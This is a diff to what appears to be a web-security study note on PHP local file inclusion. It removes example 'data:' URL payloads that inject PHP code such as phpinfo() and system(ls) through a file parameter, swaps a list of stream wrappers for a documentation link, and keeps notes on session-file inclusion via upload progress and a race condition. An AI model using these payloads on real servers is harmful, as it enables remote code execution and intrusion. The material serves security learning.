@@ -39,14 +39,8 @@ phar://path.zip/file.php
 
 zip://path.zip%23file.php
 // php5.3.0up, work as phar://, but need absolute path, and need to encode # as %23
-
-data:URL schema
-// php5.2up, two settings in php.ini set to on
-?file=data:text/plain,<?php phpinfo();?>
-?file=data:text/plain,<?php system(ls);?>
-?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b (base64 encode phpinfo)
 ```  
-More protocol：`file://`,`ftp://`,`zlib://`,`glob://`,`ssh2://`,`rar://`,`ogg://`,`expect://`  
+[List of Available Filters](http://php.net/manual/en/filters.php)
 
 2. Session inclusion  
 We can control the content of session, and we also know the path of session...  
@@ -56,7 +50,7 @@ Path of session can be got from `session_save_path` in phpinfo
 `session.upload_progress.name` ➡️ create session file ➡️ filename: `sess_{PHPSESSID}`  
 ![](https://github.com/shinmao/Web-Security-Learning/blob/master/LFI/burp_multipart.png)
 As long as `PHP_SESSION_UPLOAD_PROGRESS` in POST of multipart/form-data and `session.upload_progress.enabled = On` (fortunately default is on), PHP session files would be created no matter `session.auto_start = 0`! Then to deal with the problem of `session.upload_progress.cleanup = On`, we need race condition.  
-[hitcon 2018受虐笔记一:one-line-php-challenge 学习 by wonderkun](http://wonderkun.cc/index.html/?cat=1)  
+[hitcon 2018受虐笔记一:one-line-php-challenge 学习 by wonderkun](http://wonderkun.cc/index.html/?cat=1&paged=3)  
 [Session Upload Progress ](http://php.net/manual/en/session.upload-progress.php)  
 
 3. Log inclusion  
